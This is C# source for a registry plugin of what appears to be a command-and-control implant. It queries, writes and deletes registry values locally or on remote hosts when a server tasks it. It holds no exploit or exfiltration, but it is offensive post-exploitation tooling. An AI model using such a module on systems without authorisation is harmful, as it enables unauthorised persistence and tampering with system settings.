using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Microsoft.Win32;
using reg;
using System.Text;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "reg";
        private IAgentConfig config { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            RegArgs args = JsonSerializer.Deserialize<RegArgs>(job.task.parameters);            
            TaskResponse rr = new TaskResponse()
            {
                task_id = job.task.id,
            };

            RegistryKey rk;
            string response = string.Empty;
            args.keyPath = NormalizeKey(args.keyPath);
            if (!TryGetRegistryKey(args.hostName, args.keyPath, out rk, out response))
            {
                rr.status = "error";
                rr.completed = true;
                rr.user_output = response;
                await this.messageManager.AddResponse(rr);
                return;
            }
            switch (args.action)
            {
                case "query":
                    if (!TryQueryRegKey(rk, args.keyPath, out response))
                    {
                        rr.status = "error";
                    }
                    rr.user_output = response;
                    rr.completed = true;
                    break;
                case "add":
                    bool err = false;
                    switch (args.keyType){
                        case "string":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.String, out response);
                            break;
                        case "dword":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.DWord, out response);
                            break;
                        case "qword":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.QWord, out response);
                            break;
                        case "binary":
                            err = TryAddRegKey(rk, args.keyName, Misc.Base64DecodeToByteArray(args.keyValue), RegistryValueKind.Binary, out response);
                            break;
                        case "multi_string":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue.Split(','), RegistryValueKind.MultiString, out response);
                            break;
                        case "expand_string":
                            err = TryAddRegKey(rk, args.keyName, args.keyValue, RegistryValueKind.ExpandString, out response);
                            break;
                        default:
                            err = true;
                            response = "Invalid key type selected.";
                            break;
                    }
                    if (!err)
                    {
                        rr.status = "error";
                    }
                    rr.user_output = response;
                    rr.completed = true;
                    break;
                case "delete":
                    if(!TryDeleteRegKey(rk, args.keyPath, args.keyName, out response))
                    {
                        rr.status = "error";
                    }
                    rr.user_output = response;
                    rr.completed = true;
                    break;
                default:
                    break;
            }

            await messageManager.AddResponse(rr);
        }
        private bool TryDeleteRegKey(RegistryKey rk, string keyPath,string keyName, out string message)
        {
            try
            {
                RegistryKey dk;
                string hive = keyPath.Split('\\')[0];
                hive = hive.ToUpper();
                keyPath = keyPath.Replace(hive, "").TrimStart('\\');
                dk = rk.OpenSubKey(keyPath);

                if(rk is null)
                {
                    message = "key not found.";
                    return false;
                }
                
                rk.DeleteValue(keyName, true);

                message = "Success.";
                return true;
            }
            catch (Exception e)
            {
                message = e.ToString();
                return false;
            }
        }
        private bool TryQueryRegKey(RegistryKey rk, string keyPath, out string message)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendFormat("Main Key: {0}", rk).AppendLine();
                foreach (var Subkey in rk.GetValueNames()) // var = type ambiguous
                {
                    if (rk.GetValueKind(Subkey).ToString().ToLower() == "binary")
                    {
                        var value = (byte[])rk.GetValue(Subkey);
                        sb.AppendFormat("{0} - {1} - {2}", Subkey, rk.GetValueKind(Subkey), PrintByteArray(value)).AppendLine();
                    }
                    else
                    {
                        sb.AppendFormat("{0} - {1} - {2}", Subkey, rk.GetValueKind(Subkey), rk.GetValue(Subkey)).AppendLine();

                    }

                }

                message = sb.ToString();
                return true;
            }
            catch (Exception e)
            {
                message = e.ToString();
                return false;
            }
        }
        private bool TryAddRegKey<T>(RegistryKey rk, string keyName, T keyValue, RegistryValueKind valueType, out string message)
        {
            try
            {
                if (string.IsNullOrEmpty(keyName))
                {
                    keyName = "";
                }
                rk.SetValue(keyName, keyValue, valueType);
                message = "Added.";
                return true;
            }
            catch (Exception e)
            {
                message = e.ToString();
                return false;
            }
        }
        private string NormalizeKey(string text)
        {
            Dictionary<string, string> dic = new Dictionary<string, string>()
            {
                {"HKEY_LOCAL_MACHINE","HKLM" },
                {"HKEY_CURRENT_USER", "HKCU" },
                {"HKEY_USERS", "HKU" },
                {"HKEY_CURRENT_CONFIG", "HKCC" },

            };

            string hive = text.Split("\\")[0];

            if (dic.ContainsKey(hive))
            {
                text = text.Replace(hive, dic[hive]);
            }

            return text;
        }
        private bool TryGetRegistryKey(string hostname, string keyPath, out RegistryKey rk, out string err)
        {
            string[] regParts = keyPath.Split('\\');
            string hive = regParts[0];
            hive = hive.ToUpper();
            string path = string.Join('\\', regParts, 1, regParts.Length - 1);
            try
            {
                switch (hive)
                {
                    case "HKCU":
                        rk = string.IsNullOrEmpty(hostname) ? Registry.CurrentUser.CreateSubKey(path) :
                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, hostname).CreateSubKey(path);
                        err = "";
                        return true;
                    case "HKU":
                        rk = string.IsNullOrEmpty(hostname) ? Registry.Users.CreateSubKey(path) :
                            RegistryKey.OpenRemoteBaseKey(RegistryHive.Users, hostname).CreateSubKey(path);
                        err = "";
                        return true;
                    case "HKCC":
                        rk = string.IsNullOrEmpty(hostname) ? Registry.CurrentConfig.CreateSubKey(path) :
                            RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentConfig, hostname).CreateSubKey(path);
                        err = "";
                        return true;
                    case "HKLM":
                        rk = string.IsNullOrEmpty(hostname) ? Registry.LocalMachine.CreateSubKey(path) :
                            RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, hostname).CreateSubKey(path);
                        err = "";
                        return true;
                    default:
                        rk = null;
                        err = "Invalid hive selected.";
                        return false;
                }
            }
            catch (Exception e)
            {
                rk = null;
                err = e.ToString();
                return false;
            }
        }
        private string PrintByteArray(byte[] Bytes)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < Bytes.Length; ++i)
            {
                sb.Append(string.Format("{0:X2}" + " ", Bytes[i]));
            }
            return sb.ToString();
        }
    }
}
